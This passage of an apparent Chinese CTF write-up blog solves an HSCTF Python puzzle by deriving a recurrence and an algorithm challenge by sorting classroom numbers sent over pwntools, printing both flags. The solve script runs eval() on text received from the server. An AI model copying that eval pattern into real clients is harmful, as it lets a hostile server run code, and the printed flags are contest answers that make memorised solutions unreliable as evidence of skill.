<br>    add = func1(go = <span class="hljs-literal">True</span>)<br>    require += add<br>    <span class="hljs-keyword">return</span> require<br><br>add = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">therealreal</span>(<span class="hljs-params">update</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">modify</span>(<span class="hljs-params">require = []</span>):<br>        require += update()<br>        <br>        <span class="hljs-keyword">global</span> add<br>        require.append(add)<br>        add += <span class="hljs-number">10</span><br>        <span class="hljs-keyword">return</span> require<br>    <br>    <span class="hljs-keyword">return</span> modify<br>    <br>use = therealreal(func1)<br>upto = <span class="hljs-number">213</span><br><br>calc = use()<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, upto+<span class="hljs-number">1</span>):<br>    calc = use(calc)<br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">sum</span>(calc))<br><br></code></pre></td></tr></table></figure>
+<p>python是真的能写出花来…</p>
+<p>手动分析分析的我云里雾里的，有些变量的变化完全搞不懂…不如来直接看结果。</p>
+<p>我先讲upto改成了3然后讲calc打印出来看看。</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[</span><br><span class="hljs-string">20, 20, 10, </span><br><span class="hljs-string">20, 20, 20, 20, 20, 20, 20, </span><br><span class="hljs-string">20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 30, </span><br><span class="hljs-string">20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 40</span><br><span class="hljs-string">]</span><br></code></pre></td></tr></table></figure>
+<p>这里其实可以看出来规律了。可以看到10，20，30，40算是一项的分界线。那么他们前面都是20这个数字。第一项20的个数是2个，而第二项是6个，后面是14，30。这里可以得到20的个数的递推式：</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mn>2</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_n = 2(a_{n-1}+1)
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p>
+<p>第一项为2。那么我们可以得到后面每次增加的20的个数。</p>
+<p>还有就是10，20，30这个数列。直接加上就好了。</p>
+<p>所以每次use返回的就是以下数列：</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Y</mi><mi>n</mi></msub><mo>=</mo><mn>10</mn><msub><mi>a</mi><mi>n</mi></msub><mo>+</mo><mn>10</mn><msub><mi>b</mi><mi>n</mi></msub><mspace linebreak="newline"></mspace><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mn>2</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>b</mi><mi>n</mi></msub><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">Y_n = 10a_n + 10b_n \\
+a_n = 2(a_{n-1}+1) \\
+b_n = n
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span></span></p>
+<p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">an = [<span class="hljs-number">4</span>]<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    an.append(an[-<span class="hljs-number">1</span>]*<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)<br>bn = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">251</span>)]<br>Yn = [an[i] + bn[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bn))]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">sum</span>(Yn[:<span class="hljs-number">214</span>])*<span class="hljs-number">10</span>)<br><br><span class="hljs-comment"># 2106245833371143733958360553673408646377901908010982225086219772130</span><br><span class="hljs-comment"># flag&#123;2106245833371143733958360553673408646377901908010982225086219772130&#125;</span><br></code></pre></td></tr></table></figure>
+<h1 id="algorithm"><a class="markdownIt-Anchor" href="#algorithm"></a> Algorithm</h1>
+<p>这个分类，emmm有点像acm？</p>
+<h2 id="travelling-salesman"><a class="markdownIt-Anchor" href="#travelling-salesman"></a> <strong>travelling-salesman</strong></h2>
+<p>Description:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Euclidean</span> traveling salesman over single dimension? nc travelling-salesman.hsctf.com <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure>
+<p>有个算法附件。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Task</span><br><span class="hljs-attribute">You</span> are handing out newspapers to classrooms in HSN. There is a list of classrooms given to you that you<br><span class="hljs-attribute">have</span> to visit. These classrooms are conveniently located in a single hallway, which has <span class="hljs-number">100</span> classrooms<br><span class="hljs-attribute">numbered</span> <span class="hljs-number">1</span> .. <span class="hljs-number">100</span> in order. Since you are lazy, you want to minimize your walking distance. Given that you<br><span class="hljs-attribute">must</span> start and end at classroom <span class="hljs-number">1</span>, output the order of classes to visit in order to minimize your walking<br><span class="hljs-attribute">distance</span>. If there are multiple solutions, output any.<br><span class="hljs-attribute">Interaction</span> Details:<br><span class="hljs-attribute">There</span> will be <span class="hljs-number">3</span> test cases.<br><span class="hljs-attribute">For</span> each test case, you will be given an array of integers representing the classrooms to visit. You will then be<br><span class="hljs-attribute">prompted</span> to enter a list of space separated integers representing the order in which the classrooms will be<br><span class="hljs-attribute">visited</span>.<br><span class="hljs-attribute">Sample</span> Interaction:<span class="hljs-meta"></span><br><span class="hljs-meta">[59, 68, 24, 83]</span><br><span class="hljs-attribute">order</span>: <span class="hljs-number">59</span> <span class="hljs-number">83</span> <span class="hljs-number">68</span> <span class="hljs-number">24</span><span class="hljs-meta"></span><br><span class="hljs-meta">[27, 29, 43, 50, 78, 21, 70, 89, 93, 85]</span><br><span class="hljs-attribute">order</span>: <span class="hljs-number">27</span> <span class="hljs-number">29</span> <span class="hljs-number">43</span> <span class="hljs-number">50</span> <span class="hljs-number">78</span> <span class="hljs-number">21</span> <span class="hljs-number">70</span> <span class="hljs-number">89</span> <span class="hljs-number">93</span> <span class="hljs-number">85</span><br><span class="hljs-attribute">Distance</span> too large<br></code></pre></td></tr></table></figure>
+<p>就是100个教室，我从第一个开始，走到给定的order的教室。要把全部需要的教室走完，最后回到1。这个其实直接排序就行了，最靠后的教室是一定要去的。所以我们只要走到最远的教室之中把需要的都走到就行，也就是排序。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br><br>r = pwn.remote(<span class="hljs-string">&quot;travelling-salesman.hsctf.com&quot;</span>, <span class="hljs-number">1337</span>)<br>r.recvline() <span class="hljs-comment"># == proof-of-work: disabled ==</span><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    order = <span class="hljs-built_in">eval</span>(r.recvuntil(<span class="hljs-string">b&quot;order:&quot;</span>).replace(<span class="hljs-string">b&quot;\norder:&quot;</span>, <span class="hljs-string">b&quot;&quot;</span>))<br>    <span class="hljs-built_in">print</span>(order)<br>    r.send(<span class="hljs-string">&quot; &quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,<span class="hljs-built_in">sorted</span>(order)))).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;\n&quot;</span>)<br><br><span class="hljs-built_in">print</span>(r.recvline())<br></code></pre></td></tr></table></figure>
+<p>就可以得到flag。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[x] Opening connection to travelling-salesman.hsctf.com on port 1337<br>[x] Opening connection to travelling-salesman.hsctf.com on port 1337: Trying 34.147.9.219<br>[+] Opening connection to travelling-salesman.hsctf.com on port 1337: Done<br>[66, 57, 61, 98]<br>[81, 97, 50, 42, 52, 15, 36, 51, 31, 85]<br>[78, 71, 27, 17, 54, 55, 83, 77, 64, 45, 58, 40, 20, 35, 29, 86, 34, 22, 48, 43, 19, 73, 33, 81, 70, 94, 16, 65, 36, 79]<br>[61, 46, 59, 58, 87, 75, 64, 52, 66, 81, 76, 74, 11, 22, 72, 14, 34, 85, 37, 45, 24, 43, 19, 36, 20, 27, 79, 69, 53, 56, 13, 62, 35, 60, 16, 39, 42, 93, 48, 26, 29, 33, 54, 99, 38, 65, 83, 12, 50, 84]<br>[84, 42, 72, 59, 46, 40, 73, 96, 70, 62, 33, 22, 92, 43, 29, 49, 71, 27, 41, 37, 97, 78, 50, 98, 74, 87, 85, 51, 65, 55, 14, 39, 12, 34, 89, 38, 75, 28, 86, 19, 81, 83, 63, 36, 52, 25, 69, 58, 48, 32]<br>b&#x27; flag&#123;the_fitness_gram_pacer_test_is_a_multistage_aerobic_capacity_test_8182295882010254837&#125;\n&#x27;<br>[*] Closed connection to travelling-salesman.hsctf.com port 1337<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">flag&#123;the_fitness_gram_pacer_test_is_a_multistage_aerobic_capacity_test_8182295882010254837&#125;</span><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Crypto/">Crypto</a>
+                    
+                      <a class="hover-with-bg" href="/tags/MISC/">MISC</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Reverse/">Reverse</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/09/BCACTF-3-0/">
+                        <span class="hidden-mobile">BCACTF 3.0</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
